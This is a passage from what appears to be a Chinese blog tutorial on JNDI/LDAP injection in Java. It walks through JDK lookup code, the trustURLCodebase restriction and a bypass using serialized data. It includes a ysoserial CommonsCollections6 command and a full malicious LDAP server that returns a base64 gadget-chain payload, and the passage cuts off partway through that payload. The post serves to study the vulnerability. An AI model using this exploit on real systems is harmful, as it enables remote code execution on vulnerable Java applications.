+</span></span><span style="display:flex;"><span>                appendVector<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">respCtls</span><span style="color:#f92672">,</span> var8<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            var4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BasicAttributes<span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(((</span>Attributes<span style="color:#f92672">)</span>var4<span style="color:#f92672">).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>Obj<span style="color:#f92672">.</span><span style="color:#a6e22e">JAVA_ATTRIBUTES</span><span style="color:#f92672">[</span><span style="color:#ae81ff">2</span><span style="color:#f92672">])</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//var3接收reference对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            var3 <span style="color:#f92672">=</span> Obj<span style="color:#f92672">.</span><span style="color:#a6e22e">decodeObject</span><span style="color:#f92672">((</span>Attributes<span style="color:#f92672">)</span>var4<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>var3 <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            var3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> LdapCtx<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fullyQualifiedName</span><span style="color:#f92672">(</span>var1<span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>LdapReferralException var20<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        LdapReferralException var5 <span style="color:#f92672">=</span> var20<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">handleReferrals</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> var2<span style="color:#f92672">.</span><span style="color:#a6e22e">fillInException</span><span style="color:#f92672">(</span>var20<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            LdapReferralContext var6 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>LdapReferralContext<span style="color:#f92672">)</span>var5<span style="color:#f92672">.</span><span style="color:#a6e22e">getReferralContext</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">envprops</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">bindCtls</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                Object var7 <span style="color:#f92672">=</span> var6<span style="color:#f92672">.</span><span style="color:#a6e22e">lookup</span><span style="color:#f92672">(</span>var1<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> var7<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>LdapReferralException var18<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                var5 <span style="color:#f92672">=</span> var18<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">finally</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                var6<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NamingException var21<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> var2<span style="color:#f92672">.</span><span style="color:#a6e22e">fillInException</span><span style="color:#f92672">(</span>var21<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//调用了getObjectInstance方法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> DirectoryManager<span style="color:#f92672">.</span><span style="color:#a6e22e">getObjectInstance</span><span style="color:#f92672">(</span>var3<span style="color:#f92672">,</span> var1<span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">envprops</span><span style="color:#f92672">,</span> <span style="color:#f92672">(</span>Attributes<span style="color:#f92672">)</span>var4<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NamingException var16<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> var2<span style="color:#f92672">.</span><span style="color:#a6e22e">fillInException</span><span style="color:#f92672">(</span>var16<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception var17<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        NamingException var24 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> NamingException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;problem generating object using object factory&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        var24<span style="color:#f92672">.</span><span style="color:#a6e22e">setRootCause</span><span style="color:#f92672">(</span>var17<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> var2<span style="color:#f92672">.</span><span style="color:#a6e22e">fillInException</span><span style="color:#f92672">(</span>var24<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><code>c_lookup</code>方法将<code>var3</code>（<code>reference</code>对象）传给了<code>getObjectInstance</code>方法的<code>refInfo</code>参数，继续跟进分析<code>getObjectInstance</code>方法</p>
+<pre tabindex="0"><code>   public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs) throws Exception {
+            ObjectFactory factory;
+            //获取对象工厂
+            ObjectFactoryBuilder builder = getObjectFactoryBuilder();
+            if (builder != null) {
+                // builder must return non-null factory
+                factory = builder.createObjectFactory(refInfo, environment);
+                if (factory instanceof DirObjectFactory) {
+                    return ((DirObjectFactory)factory).getObjectInstance(
+                        refInfo, name, nameCtx, environment, attrs);
+                } else {
+                    return factory.getObjectInstance(refInfo, name, nameCtx,
+                        environment);
+                }
+            }
+
+            // use reference if possible
+            Reference ref = null;
+            //判断reference对象是否为Reference
+            if (refInfo instanceof Reference) {
+                 //转换为Reference类型
+                ref = (Reference) refInfo;
+            } else if (refInfo instanceof Referenceable) {
+                ref = ((Referenceable)(refInfo)).getReference();
+            }
+
+            Object answer;
+            //reference对象是否为空
+            if (ref != null) {
+                //获取工厂类名Exp
+                String f = ref.getFactoryClassName();
+                if (f != null) {
+                    // if reference identifies a factory, use exclusively
+                    //根据工厂类远程获取对象引用
+                    factory = getObjectFactoryFromReference(ref, f);
+                    if (factory instanceof DirObjectFactory) {
+                        return ((DirObjectFactory)factory).getObjectInstance(
+                            ref, name, nameCtx, environment, attrs);
+                    } else if (factory != null) {
+                        return factory.getObjectInstance(ref, name, nameCtx,
+                                                         environment);
+                    }
+                    // No factory found, so return original refInfo.
+                    // Will reach this point if factory class is not in
+                    // class path and reference does not contain a URL for it
+                    return refInfo;
+
+                } else {
+                    // if reference has no factory, check for addresses
+                    // containing URLs
+                    // ignore name &amp; attrs params; not used in URL factory
+
+                    answer = processURLAddrs(ref, name, nameCtx, environment);
+                    if (answer != null) {
+                        return answer;
+                    }
+                }
+            }
+
+            // try using any specified factories
+            answer = createObjectFromFactories(refInfo, name, nameCtx,
+                                               environment, attrs);
+            return (answer != null) ? answer : refInfo;
+
+    }
+</code></pre><p><code>getObjectInstance</code>方法将<code>reference</code>对象转换为<code>Reference</code>类型并判断<code>reference</code>对象是否为空，如果不为空则从<code>reference</code>引用中获取工厂类<code>Exp</code>名字，接着调用<code>getObjectFactoryFromReference</code>方法根据工厂类Exp名字获取远程调用对象。</p>
+<p><code>getObjectFactoryFromReference</code>方法实现如下：</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823205453983.png" alt="image-20230823205453983"></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823205915054.png" alt="image-20230823205915054"></p>
+<p>可以看到<code>LDAP</code>服务跟<code>jndi</code>一样，会尝试先在本地查找加载<code>Exp</code>类，如果本地没有找到<code>Exp</code>类，那么<code>getFactoryClassLocation</code>方法会获取远程加载的<code>url</code>地址，如果不为空则根据远程<code>url</code>地址使用类加载器<code>URLClassLoader</code>来加载<code>Exp</code>类，通过分析发现<code>LDAP</code>服务的整个利用流程都没有<code>URLCodebase</code>限制。
+看一下整个调用站栈</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823205941606.png" alt="image-20230823205941606"></p>
+<h2 id="高版本运行">高版本运行</h2>
+<p>在<code>jdk8u191</code>以上的版本中修复了<code>LDAP</code>服务远程加载恶意类这个漏洞，<code>LDAP</code>服务在进行远程加载之前也添加了系统属性<code>trustURLCodebase</code>的限制，通过分析在<code>jdk8u191</code>版本发现，在<code>loadClass</code>方法内部添加了系统属性<code>trustURLCodebase</code>的判断，如果<code>trustURLCodebase</code>为<code>false</code>就直接返回<code>null</code>，只有当<code>trustURLCodebase</code>值为<code>true</code>时才允许远程加载。</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823210749865.png" alt="image-20230823210749865"></p>
+<p>在高版本 <code>JDK</code> 中需要通过 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 选项去启用。这个限制在 <code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 版本时加入，略晚于 <code>RMI</code> 的远程加载限制。</p>
+<h2 id="使用序列化数据触发gadget">使用序列化数据触发Gadget</h2>
+<p>触发点一：<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>存在对<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>的判断。
+<code>com.sun.jndi.ldap.Obj.java#decodeObject</code> 主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。之前讲到<code>Reference</code>对象，现在讲一下传来的是序列化的对象这种情况。
+如果是序列化对象会调用<code>deserializeObject</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823211724370.png" alt="image-20230823211724370"></p>
+<p>进入<code>deserializeObject</code>方法，发现会进行<code>readObject</code></p>
+<p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823215950079.png" alt="image-20230823215950079"></p>
+<p>搭建环境，使用<code>cc6</code>去打</p>
+<pre tabindex="0"><code>        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre><p>payload</p>
+<pre tabindex="0"><code>java -jar ysoserial.jar CommonsCollections6 &#34;calc&#34;|base64
+</code></pre><p><img src="https://gkjzjh146.github.io/jndi%E6%B3%A8%E5%85%A5%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230823224255242.png" alt="image-20230823224255242"></p>
+<p>拿到<code>\r\n</code>去除</p>
+<p><strong>服务端</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.jndi.bypass<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.InetAddress<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.ServerSocketFactory<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.SocketFactory<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.ssl.SSLSocketFactory<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.Entry<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.LDAPResult<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.ResultCode<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.util.Base64<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Deserializebypass</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LDAP_BASE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dc=example,dc=domain&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span> <span style="color:#f92672">(</span> String<span style="color:#f92672">[]</span> tmp_args <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> args<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;http://127.0.0.1:8000/#calc&#34;</span><span style="color:#f92672">};</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1389</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            InMemoryDirectoryServerConfig config <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InMemoryDirectoryServerConfig<span style="color:#f92672">(</span>LDAP_BASE<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            config<span style="color:#f92672">.</span><span style="color:#a6e22e">setListenerConfigs</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> InMemoryListenerConfig<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;listen&#34;</span><span style="color:#f92672">,</span> <span style="color:#75715e">//$NON-NLS-1$
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    InetAddress<span style="color:#f92672">.</span><span style="color:#a6e22e">getByName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span><span style="color:#f92672">),</span> <span style="color:#75715e">//$NON-NLS-1$
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    port<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>                    ServerSocketFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">(),</span>
+</span></span><span style="display:flex;"><span>                    SocketFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">(),</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">(</span>SSLSocketFactory<span style="color:#f92672">)</span> SSLSocketFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">getDefault</span><span style="color:#f92672">()));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            config<span style="color:#f92672">.</span><span style="color:#a6e22e">addInMemoryOperationInterceptor</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Deserializebypass<span style="color:#f92672">.</span><span style="color:#a6e22e">OperationInterceptor</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span>args<span style="color:#f92672">[</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">])));</span>
+</span></span><span style="display:flex;"><span>            InMemoryDirectoryServer ds <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InMemoryDirectoryServer<span style="color:#f92672">(</span>config<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Listening on 0.0.0.0:&#34;</span> <span style="color:#f92672">+</span> port<span style="color:#f92672">);</span> <span style="color:#75715e">//$NON-NLS-1$
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            ds<span style="color:#f92672">.</span><span style="color:#a6e22e">startListening</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span> Exception e <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OperationInterceptor</span> <span style="color:#66d9ef">extends</span> InMemoryOperationInterceptor <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> URL codebase<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">OperationInterceptor</span> <span style="color:#f92672">(</span> URL cb <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">codebase</span> <span style="color:#f92672">=</span> cb<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">processSearchResult</span> <span style="color:#f92672">(</span> InMemoryInterceptedSearchResult result <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            String base <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequest</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getBaseDN</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            Entry e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Entry<span style="color:#f92672">(</span>base<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                sendResult<span style="color:#f92672">(</span>result<span style="color:#f92672">,</span> base<span style="color:#f92672">,</span> e<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span> Exception e1 <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                e1<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendResult</span> <span style="color:#f92672">(</span> InMemoryInterceptedSearchResult result<span style="color:#f92672">,</span> String base<span style="color:#f92672">,</span> Entry e <span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            URL turl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">codebase</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">codebase</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getRef</span><span style="color:#f92672">().</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">concat</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.class&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Send LDAP reference result for &#34;</span> <span style="color:#f92672">+</span> base <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; redirecting to &#34;</span> <span style="color:#f92672">+</span> turl<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">addAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javaClassName&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;foo&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            String cbstring <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">codebase</span><span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> refPos <span style="color:#f92672">=</span> cbstring<span style="color:#f92672">.</span><span style="color:#a6e22e">indexOf</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span> refPos <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                cbstring <span style="color:#f92672">=</span> cbstring<span style="color:#f92672">.</span><span style="color:#a6e22e">substring</span><span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">,</span> refPos<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            e<span style="color:#f92672">.</span><span style="color:#a6e22e">addAttribute</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;javaSerializedData&#34;</span><span style="color:#f92672">,</span> Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">decode</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB